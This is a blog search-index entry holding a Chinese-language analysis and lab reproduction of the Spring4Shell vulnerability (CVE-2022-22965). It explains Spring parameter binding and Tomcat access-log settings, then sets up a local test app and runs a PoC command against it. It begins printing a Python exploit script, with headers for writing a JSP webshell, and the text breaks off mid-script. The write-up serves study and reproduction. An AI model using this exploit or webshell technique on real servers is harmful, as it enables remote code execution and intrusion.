<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2022-22965漏洞分析与复现</title>
      <link href="/2022/04/17/CVE-2022-22965%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%20/"/>
      <url>/2022/04/17/CVE-2022-22965%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%20/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-22965漏洞分析与复现"><a href="#CVE-2022-22965漏洞分析与复现" class="headerlink" title="CVE-2022-22965漏洞分析与复现"></a>CVE-2022-22965漏洞分析与复现</h1><p>​        <strong>注：本文参考极盾科技相关文章，有非常多引用，但是由于太多了影响阅读因此只在标题做了标明，因此本文仅供自行学习，若有需要，可以参考原链接：</strong></p><p><a href="https://www.aqniu.com/industry/82365.html">https://www.aqniu.com/industry/82365.html</a></p><p>先来一张java现状，lol：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/img_1.png" alt="awkward situation "></p><h2 id="0x01-漏洞基本情况"><a href="#0x01-漏洞基本情况" class="headerlink" title="0x01 漏洞基本情况"></a>0x01 漏洞基本情况</h2><h3 id="基本概况："><a href="#基本概况：" class="headerlink" title="基本概况："></a>基本概况：</h3><blockquote><p>After Spring Cloud, on March 29, another heavyweight vulnerability of Spring broke out on the Internet: Spring Core RCE</p><p>On March 31 Spring released new versions which fixes the vulnerability. See section <a href="https://github.com/TheGejr/SpringShell#patching">Patching</a>.</p><p>On March 31 a <a href="https://tanzu.vmware.com/security/cve-2022-22965">CVE-number was finally assigned to the vulnerability</a> with a <a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H">CVSS score 9.8 (CRITICAL)</a></p></blockquote><h3 id="环境需求："><a href="#环境需求：" class="headerlink" title="环境需求："></a>环境需求：</h3><ol><li>JDK9及其以上版本；</li><li>使⽤了Spring-beans包； </li><li>使⽤了Spring参数绑定； </li><li>Spring参数绑定使⽤的是⾮基本参数类型，例如⼀般的POJO即可；</li></ol><p>简单的说，就是java+maven+tomcat三件套，不做赘述。</p><h2 id="0x02-背景知识（部分引用）："><a href="#0x02-背景知识（部分引用）：" class="headerlink" title="0x02 背景知识（部分引用）："></a>0x02 背景知识（部分引用）：</h2><h3 id="一、springMVC参数绑定基础"><a href="#一、springMVC参数绑定基础" class="headerlink" title="一、springMVC参数绑定基础"></a>一、springMVC参数绑定基础</h3><p>为了方便编程，SpringMVC支持将HTTP请求中的的请求参数或者请求体内容，根据Controller方法的参数，自动完成类型转换和赋值。之后，Controller方法就可以直接使用这些参数，避免了需要编写大量的代码从HttpServletRequest中获取请求数据以及类型转换。下面是一个简单的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/addUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">String <span class="title">addUser</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Department department;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Department <span class="title">getDepartment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> department;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDepartment</span><span class="params">(Department department)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.department = department;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Department</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        这里这个程序是什么呢？就是说当我们请求了<code>/addUser?name=test&amp;department.name=SEC</code>的时候，虽然我们没有给controller中的user赋值，但是我们上文中的这个test和SEC会直接赋值到user对象上，然后作为参数传入，这就是所谓的参数绑定。<br>​        那么，我们可以看到user对象里还嵌套了一层department对象，在这种情况下依然能够赋值成功，就说明SpringMVC的参数绑定是支持多层嵌套的，换言之，Spring会构造一个调用链，以实现这样的多层赋值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User.getDepartment()</span><br><span class="line">    Department.setName()</span><br></pre></td></tr></table></figure><p>​        也就是，在为user中department赋值的调用链如上，如果调用链的层数更多，当然也是同理的！</p><p>​        那么，我们提到的这个参数绑定是由谁实现的呢？SpringMVC实现参数绑定的主要类和方法是<code>WebDataBinder.doBind(MutablePropertyValues)</code>。</p><h3 id="二、Bean实现对属性的读写"><a href="#二、Bean实现对属性的读写" class="headerlink" title="二、Bean实现对属性的读写"></a>二、Bean实现对属性的读写</h3><h4 id="1、BeanWrapper"><a href="#1、BeanWrapper" class="headerlink" title="1、BeanWrapper"></a>1、BeanWrapper</h4><p>​        在Spring中，<code>BeanWrapper</code>接口是对Bean的包装，其中定义了大量可以非常方便的方法对Bean的属性进行访问和设置。<code>BeanWrapperImpl</code>类是<code>BeanWrapper</code>接口的默认实现类，<code>BeanWrapperImpl.wrappedObject</code>属性就是被包装的Bean对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanWrapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanWrapperImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BeanWrapperDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        Department department = <span class="keyword">new</span> Department();</span><br><span class="line">        department.setName(<span class="string">&quot;SEC&quot;</span>);</span><br><span class="line">        user.setDepartment(department);</span><br><span class="line"></span><br><span class="line">        BeanWrapper userBeanWrapper = <span class="keyword">new</span> BeanWrapperImpl(user);</span><br><span class="line">        userBeanWrapper.setAutoGrowNestedPaths(<span class="keyword">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;userBeanWrapper: &quot;</span> + userBeanWrapper);</span><br><span class="line">        <span class="comment">//userBeanWrapper: org.springframework.beans.BeanWrapperImpl: wrapping object [cn.jidun.User@1d371b2d]</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Before modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        <span class="comment">//user.name: foo</span></span><br><span class="line">        System.out.println(<span class="string">&quot;user.department.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;department.name&quot;</span>));</span><br><span class="line">        <span class="comment">//user.department.name: SEC</span></span><br><span class="line"></span><br><span class="line">        userBeanWrapper.setPropertyValue(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">        userBeanWrapper.setPropertyValue(<span class="string">&quot;department.name&quot;</span>, <span class="string">&quot;IT&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;After modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        <span class="comment">//user.name: bar</span></span><br><span class="line">        System.out.println(<span class="string">&quot;user.department.name: &quot;</span> + userBeanWrapper.getPropertyValue(<span class="string">&quot;department.name&quot;</span>));</span><br><span class="line">        user.department.name: IT</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        从上面的案例中可以看到，调用<code>BeanWrapper</code>类的<code>getPropertyValue()</code>函数可以实现对象属性的读操作，而<code>setPropertyValue()</code>函数可以实现对象属性的写操作。</p><p>​        那么我们进一步深究，这些函数的具体实现是通过什么呢？其下层实现是通过<code>PropertyDescriptor</code>类完成的。</p><h4 id="2、PropertyDescriptor"><a href="#2、PropertyDescriptor" class="headerlink" title="2、PropertyDescriptor"></a>2、PropertyDescriptor</h4><p>​        <code>PropertyDescriptor</code>是JDK自带的<code>java.beans</code>包下的类，意为属性描述器，用于获取符合Java Bean规范的对象属性和get/set方法。下面是一个简单的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.BeanInfo;</span><br><span class="line"><span class="keyword">import</span> java.beans.Introspector;</span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyDescriptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PropertyDescriptorDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        BeanInfo userBeanInfo = Introspector.getBeanInfo(User.class);</span><br><span class="line">        <span class="comment">//获取user类的BeanInfo</span></span><br><span class="line">        PropertyDescriptor[] descriptors = userBeanInfo.getPropertyDescriptors();</span><br><span class="line">        <span class="comment">//获取user类每个属性的Descriptor</span></span><br><span class="line">        PropertyDescriptor userNameDescriptor = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (PropertyDescriptor descriptor : descriptors) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (descriptor.getName().equals(<span class="string">&quot;name&quot;</span>)) &#123;<span class="comment">//获取name属性的Descriptor</span></span><br><span class="line">                userNameDescriptor = descriptor;</span><br><span class="line">                System.out.println(<span class="string">&quot;userNameDescriptor: &quot;</span> + userNameDescriptor);</span><br><span class="line">                <span class="comment">//userNameDescriptor: java.beans.PropertyDescriptor[name=name; values=&#123;expert=false; visualUpdate=false; hidden=false; enumerationValues=[Ljava.lang.Object;@5cb9f472; required=false&#125;; propertyType=class java.lang.String; readMethod=public java.lang.String cn.jidun.User.getName(); writeMethod=public void cn.jidun.User.setName(java.lang.String)]</span></span><br><span class="line">                <span class="comment">//输出了一大串，可以看到最下面输出了name属性的读写方法。</span></span><br><span class="line">                </span><br><span class="line">                System.out.println(<span class="string">&quot;Before modification: &quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;user.name: &quot;</span> + userNameDescriptor.getReadMethod().invoke(user));</span><br><span class="line">                <span class="comment">//user.name: foo</span></span><br><span class="line">                <span class="comment">//对于读方法的调用</span></span><br><span class="line">                </span><br><span class="line">                userNameDescriptor.getWriteMethod().invoke(user, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">                <span class="comment">//对于写方法的调用</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;After modification: &quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;user.name: &quot;</span> + userNameDescriptor.getReadMethod().invoke(user));</span><br><span class="line">        <span class="comment">//user.name: bar</span></span><br><span class="line">        <span class="comment">//经过了写入操作，果然变了，证明写入操作是有效的</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        可以看到，对于上述方法的调用果然要比BeanWrapper要复杂的多，换言之就是封装程度低，也就是处于更加底层的位置了。</p><p>​        通过这一部分，我们学到Spring中Bean对象由<strong>BeanWrapper</strong>包装，然后其下层的实现是由<strong>PropertyDescriptor</strong>作为储存每一个属性的<strong>getter</strong>和<strong>setter</strong>的集合。</p><h3 id="三、Tomcat日志"><a href="#三、Tomcat日志" class="headerlink" title="三、Tomcat日志"></a>三、Tomcat日志</h3><p>​            <code>Valve</code>是tomcat中用于处理请求和响应的一种结构，tomcat通过组合多个<code>Valve</code>的<code>Pipeline</code>（管道队列），来实现按次序对请求和响应进行一系列的处理。其中<code>AccessLogValve</code>的作用是，用来记录访问日志（<code>access_log</code>）。Tomcat的<code>server.xml</code>中默认配置了<code>AccessLogValve</code>，因此所有部署在Tomcat中的Web应用均会执行该<code>Valve</code>，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.valves.AccessLogValve&quot;</span> <span class="attr">directory</span>=<span class="string">&quot;logs&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">               <span class="attr">prefix</span>=<span class="string">&quot;localhost_access_log&quot;</span> <span class="attr">suffix</span>=<span class="string">&quot;.txt&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">               <span class="attr">pattern</span>=<span class="string">&quot;%h %l %u %t <span class="symbol">&amp;quot;</span>%r<span class="symbol">&amp;quot;</span> %s %b&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>其中属性意义如下：</p><ul><li>directory：access_log文件输出目录。</li><li>prefix：access_log文件名前缀。</li><li>pattern：access_log文件内容格式。</li><li>suffix：access_log文件名后缀。</li><li>fileDateFormat：access_log文件名日期后缀，默认为<code>.yyyy-MM-dd</code>。</li></ul><p>​        那么通过这些背景知识，我们大致也就可以猜到，这个漏洞就是通过上述的mvc属性绑定，更改了<code>AccessLogValue</code>，以达到在服务器端webshell写入。</p><h2 id="0x03-复现过程"><a href="#0x03-复现过程" class="headerlink" title="0x03 复现过程"></a>0x03 复现过程</h2><p>复现吧！</p><p>网上流传最多的来自： <a href="https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py%E7%9A%84poc%E6%88%90%E5%8A%9F%E7%8E%87%E5%92%8C%E5%AF%B9%E4%BA%8E%E7%89%88%E6%9C%AC%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7%E8%BE%83%E4%BD%8E%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%82%E7%9C%8B%E4%B8%8B%E9%9D%A2%E4%B8%80%E9%83%A8%E5%88%86%E6%88%91%E7%BB%99%E5%87%BA%E7%9A%84poc%E3%80%82">https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/0c557e85ba903c7ad6f50c0306f6c8271736c35e/poc.py的poc成功率和对于版本的兼容性较低，可以参看下面一部分我给出的poc。</a></p><h3 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h3><p>操作系统：<strong>Win10</strong>或<strong>Linux</strong>系统都可</p><p>JDK版本：Java(TM) SE Runtime Environment (build <strong>15.0.2</strong>+7-27)</p><p>tomcat版本：apache-tomcat-<strong>9.0.60</strong>（注意要在<strong>9.0.62</strong>以前！）</p><p>springboot：<strong>2.6.3</strong></p><h3 id="二、代码编写"><a href="#二、代码编写" class="headerlink" title="二、代码编写"></a>二、代码编写</h3><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220408161635154.png" alt="image-20220408161635154" style="zoom: 67%;" /><p>​        写一个<strong>user</strong>实体类，随便给个属性，设置上get和set方法，然后提供一个添加用户的接口（<strong>UserController</strong>），最后提供一个Springboot的启动类（<strong>ApplicationMain</strong>），实现起来比较简单，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.lu.pojo.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/addUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">String <span class="title">addUser</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.builder.SpringApplicationBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.support.SpringBootServletInitializer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationMain</span> <span class="keyword">extends</span> <span class="title">SpringBootServletInitializer</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> SpringApplicationBuilder <span class="title">configure</span><span class="params">(SpringApplicationBuilder builder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> builder.sources(ApplicationMain.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(ApplicationMain.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三、测试步骤"><a href="#三、测试步骤" class="headerlink" title="三、测试步骤"></a>三、测试步骤</h3><ol><li>使用命令：<code>mvn clean package</code>打包为**.WAR**文件；</li><li>放在<strong>tomcat</strong>的<strong>webapps</strong>目录下，tomcat中<strong>bin</strong>目录下<strong>start</strong>开启tomcat；</li><li>访问<a href="http://localhost:8080/CVE-2022-22965-0.0.1-SNAPSHOT/addUser%EF%BC%8C%E6%98%BE%E7%A4%BAok%EF%BC%8C%E8%AF%B4%E6%98%8E%E9%83%A8%E7%BD%B2%E6%88%90%E5%8A%9F%E3%80%82">http://localhost:8080/CVE-2022-22965-0.0.1-SNAPSHOT/addUser，显示ok，说明部署成功。</a></li><li>执行poc脚本（poc见下一部分），按照poc显示的位置进行命令执行：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py --url http://localhost:8080/CVE-2022-22965-0.0.1-SNAPSHOT/addUser</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220409155701904.png" alt="image-20220409155701904"></p><h2 id="0x04-POC拆解："><a href="#0x04-POC拆解：" class="headerlink" title="0x04 POC拆解："></a>0x04 POC拆解：</h2><h3 id="一、poc源码："><a href="#一、poc源码：" class="headerlink" title="一、poc源码："></a>一、poc源码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin,urlparse</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span>(<span class="params">Thread</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(self.__class__, self).__init__()</span><br><span class="line"></span><br><span class="line">        self.url = url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;suffix&quot;</span>: <span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c1&quot;</span>: <span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;c2&quot;</span>: <span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">            <span class="string">&quot;DNT&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        data = <span 